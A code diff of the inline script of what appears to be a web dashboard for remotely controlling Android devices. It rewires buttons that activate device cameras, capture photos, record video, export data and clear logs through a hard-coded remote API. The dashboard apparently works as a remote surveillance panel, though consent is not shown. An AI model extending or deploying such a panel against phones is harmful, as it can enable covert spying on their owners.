@@ -443,193 +443,6 @@
             }
         }
 
-        // Modal functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            const modal = document.getElementById('deviceModal');
-            const closeBtn = document.querySelector('.close');
-            const closeModalBtn = document.getElementById('closeModalBtn');
-            
-            // Close modal functions
-            function closeModal() {
-                modal.style.display = 'none';
-            }
-            
-            closeBtn.onclick = closeModal;
-            closeModalBtn.onclick = closeModal;
-            
-            // Close modal when clicking outside
-            window.onclick = function(event) {
-                if (event.target === modal) {
-                    closeModal();
-                }
-            }
-
-            // Tab functionality
-            const tabBtns = document.querySelectorAll('.tab-btn');
-            tabBtns.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const tabId = this.getAttribute('data-tab');
-                    
-                    // Remove active class from all tabs and contents
-                    tabBtns.forEach(tb => tb.classList.remove('active'));
-                    document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-                    
-                    // Add active class to current tab and content
-                    this.classList.add('active');
-                    document.getElementById(tabId + 'Tab').classList.add('active');
-
-                    // Data tab specific actions
-                    if (tabId === 'data' && typeof app !== 'undefined') {
-                        app.loadDeviceData();
-                    }
-                });
-            });
-
-            // Toggle switch functionality
-            const toggleSwitches = document.querySelectorAll('.toggle-input');
-            toggleSwitches.forEach(toggle => {
-                toggle.addEventListener('change', function() {
-                    const label = this.nextElementSibling;
-                    const textSpan = label.querySelector('.toggle-text');
-                    
-                    if (this.checked) {
-                        textSpan.textContent = label.querySelector('.toggle-text').getAttribute('data-on') || 'ON';
-                    } else {
-                        textSpan.textContent = label.querySelector('.toggle-text').getAttribute('data-off') || 'OFF';
-                    }
-                });
-            });
-
-            // Range slider functionality
-            const chargeMin = document.getElementById('chargeMin');
-            const chargeMax = document.getElementById('chargeMax');
-            const minLabel = document.getElementById('minLabel');
-            const maxLabel = document.getElementById('maxLabel');
-
-            if (chargeMin && chargeMax) {
-                chargeMin.addEventListener('input', function() {
-                    minLabel.textContent = this.value + '%';
-                    if (parseInt(chargeMax.value) < parseInt(this.value)) {
-                        chargeMax.value = this.value;
-                        maxLabel.textContent = this.value + '%';
-                    }
-                });
-
-                chargeMax.addEventListener('input', function() {
-                    maxLabel.textContent = this.value + '%';
-                    if (parseInt(chargeMin.value) > parseInt(this.value)) {
-                        chargeMin.value = this.value;
-                        minLabel.textContent = this.value + '%';
-                    }
-                });
-            }
-
-            // Sound mode buttons
-            const soundBtns = document.querySelectorAll('[data-sound]');
-            soundBtns.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    soundBtns.forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                });
-            });
-
-            // 📸 Camera buttons functionality
-            const frontCameraBtn = document.getElementById('frontCameraBtn');
-            const backCameraBtn = document.getElementById('backCameraBtn');
-            const capturePhotoBtn = document.getElementById('capturePhotoBtn');
-            const recordVideoBtn = document.getElementById('recordVideoBtn');
-
-            if (frontCameraBtn) {
-                frontCameraBtn.addEventListener('click', function() {
-                    frontCameraBtn.classList.add('active');
-                    backCameraBtn.classList.remove('active');
-                    if (typeof app !== 'undefined') {
-                        app.activateCamera('front');
-                    }
-                });
-            }
-
-            if (backCameraBtn) {
-                backCameraBtn.addEventListener('click', function() {
-                    backCameraBtn.classList.add('active');
-                    frontCameraBtn.classList.remove('active');
-                    if (typeof app !== 'undefined') {
-                        app.activateCamera('back');
-                    }
-                });
-            }
-
-            if (capturePhotoBtn) {
-                capturePhotoBtn.addEventListener('click', function() {
-                    if (typeof app !== 'undefined') {
-                        app.capturePhoto();
-                    }
-                });
-            }
-
-            if (recordVideoBtn) {
-                recordVideoBtn.addEventListener('click', function() {
-                    if (typeof app !== 'undefined') {
-                        app.recordVideo();
-                    }
-                });
-            }
-
-            // 📊 NEW: Data tab buttons
-            const refreshDataBtn = document.getElementById('refreshDataBtn');
-            const exportDataBtn = document.getElementById('exportDataBtn');
-            const clearDataBtn = document.getElementById('clearDataBtn');
-            const clearLogsBtn = document.getElementById('clearLogsBtn');
-            const historyPeriodBtns = document.querySelectorAll('[data-period]');
-
-            if (refreshDataBtn) {
-                refreshDataBtn.addEventListener('click', function() {
-                    if (typeof app !== 'undefined') {
-                        app.loadDeviceData();
-                    }
-                });
-            }
-
-            if (exportDataBtn) {
-                exportDataBtn.addEventListener('click', function() {
-                    if (typeof app !== 'undefined') {
-                        app.exportDeviceData();
-                    }
-                });
-            }
-
-            if (clearDataBtn) {
-                clearDataBtn.addEventListener('click', function() {
-                    if (confirm('Clear all device data?')) {
-                        if (typeof app !== 'undefined') {
-                            app.clearDeviceData();
-                        }
-                    }
-                });
-            }
-
-            if (clearLogsBtn) {
-                clearLogsBtn.addEventListener('click', function() {
-                    if (confirm('Clear all logs?')) {
-                        document.getElementById('logsList').innerHTML = '';
-                        app.showToast('Logs cleared successfully');
-                    }
-                });
-            }
-
-            // History period buttons
-            historyPeriodBtns.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    historyPeriodBtns.forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                    const period = this.getAttribute('data-period');
-                    if (typeof app !== 'undefined') {
-                        app.loadHistoryData(period);
-                    }
-                });
-            });
-        });
-
         // Global function to open modal with device data
         function openDeviceModal(deviceData) {
             const modal = document.getElementById('deviceModal');
@@ -659,6 +472,180 @@
             // Show modal
             modal.style.display = 'block';
         }
+
+        // 🛠️ EMERGENCY CAMERA FIX
+        function manualCameraTest() {
+            console.log('🛠️ Manual camera test started...');
+            
+            // Create test device data
+            const testDevice = {
+                device_id: "test_device_manual",
+                device_model: "Samsung Galaxy S21",
+                battery_percent: 65,
+                android_version: "Android 13",
+                created_at: new Date().toISOString()
+            };
+            
+            // Set as current device
+            window.app.currentDevice = testDevice;
+            console.log('📱 Test device set:', testDevice);
+            
+            // Send camera command directly
+            sendCameraCommandDirect('activate', 'front');
+        }
+
+        // Direct camera command function
+        async function sendCameraCommandDirect(action, cameraType) {
+            console.log('📷 Sending direct camera command:', { action, cameraType });
+            
+            try {
+                const payload = {
+                    device_id: "test_device_manual",
+                    device_model: "Samsung Galaxy S21", 
+                    action: action,
+                    camera_type: cameraType
+                };
+                
+                console.log('📷 Payload:', payload);
+                
+                const response = await fetch('https://sukh-3qtl.onrender.com/api/camera', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                console.log('📷 Response status:', response.status);
+                const result = await response.json();
+                console.log('📷 Camera command result:', result);
+                
+                if (result.success) {
+                    alert('✅ SUCCESS: ' + result.message);
+                } else {
+                    alert('❌ FAILED: ' + result.message);
+                }
+            } catch (error) {
+                console.error('❌ Camera command error:', error);
+                alert('💥 NETWORK ERROR: ' + error.message);
+            }
+        }
+
+        // DOM Content Loaded - FIXED EVENT LISTENERS
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🔧 Initializing dashboard event listeners...');
+            
+            const modal = document.getElementById('deviceModal');
+            const closeBtn = document.querySelector('.close');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            
+            // Close modal functions
+            function closeModal() {
+                modal.style.display = 'none';
+                if (window.app) {
+                    window.app.currentDevice = null;
+                }
+            }
+            
+            if (closeBtn) closeBtn.onclick = closeModal;
+            if (closeModalBtn) closeModalBtn.onclick = closeModal;
+            
+            // Close modal when clicking outside
+            window.onclick = function(event) {
+                if (event.target === modal) {
+                    closeModal();
+                }
+            }
+
+            // 📸 CAMERA BUTTONS - DIRECT EVENT LISTENERS (FIXED)
+            const frontCameraBtn = document.getElementById('frontCameraBtn');
+            const backCameraBtn = document.getElementById('backCameraBtn');
+            const capturePhotoBtn = document.getElementById('capturePhotoBtn');
+            const recordVideoBtn = document.getElementById('recordVideoBtn');
+
+            console.log('📷 Camera buttons status:', {
+                front: !!frontCameraBtn,
+                back: !!backCameraBtn, 
+                capture: !!capturePhotoBtn,
+                record: !!recordVideoBtn
+            });
+
+            // Front Camera Button
+            if (frontCameraBtn) {
+                frontCameraBtn.addEventListener('click', function() {
+                    console.log('📷 Front camera button CLICKED');
+                    if (window.app && window.app.activateCamera) {
+                        window.app.activateCamera('front');
+                    } else {
+                        console.error('❌ App not loaded or activateCamera not found');
+                        alert('App not properly loaded. Please refresh the page.');
+                    }
+                });
+            }
+
+            // Back Camera Button  
+            if (backCameraBtn) {
+                backCameraBtn.addEventListener('click', function() {
+                    console.log('📷 Back camera button CLICKED');
+                    if (window.app && window.app.activateCamera) {
+                        window.app.activateCamera('back');
+                    } else {
+                        console.error('❌ App not loaded or activateCamera not found');
+                        alert('App not properly loaded. Please refresh the page.');
+                    }
+                });
+            }
+
+            // Capture Photo Button
+            if (capturePhotoBtn) {
+                capturePhotoBtn.addEventListener('click', function() {
+                    console.log('📷 Capture photo button CLICKED');
+                    if (window.app && window.app.capturePhoto) {
+                        window.app.capturePhoto();
+                    } else {
+                        console.error('❌ App not loaded or capturePhoto not found');
+                        alert('App not properly loaded. Please refresh the page.');
+                    }
+                });
+            }
+
+            // Record Video Button
+            if (recordVideoBtn) {
+                recordVideoBtn.addEventListener('click', function() {
+                    console.log('📷 Record video button CLICKED');
+                    if (window.app && window.app.recordVideo) {
+                        window.app.recordVideo();
+                    } else {
+                        console.error('❌ App not loaded or recordVideo not found');
+                        alert('App not properly loaded. Please refresh the page.');
+                    }
+                });
+            }
+
+            // Tab functionality
+            const tabBtns = document.querySelectorAll('.tab-btn');
+            tabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    
+                    tabBtns.forEach(tb => tb.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                    
+                    this.classList.add('active');
+                    document.getElementById(tabId + 'Tab').classList.add('active');
+
+                    if (tabId === 'data' && window.app && window.app.currentDevice) {
+                        window.app.loadDeviceData();
+                    }
+                });
+            });
+
+            console.log('✅ All event listeners initialized');
+        });
+
+        // Test function for console
+        window.testCamera = manualCameraTest;
+        console.log('🛠️ Test functions available: testCamera()');
     </script>
 </body>
 </html>
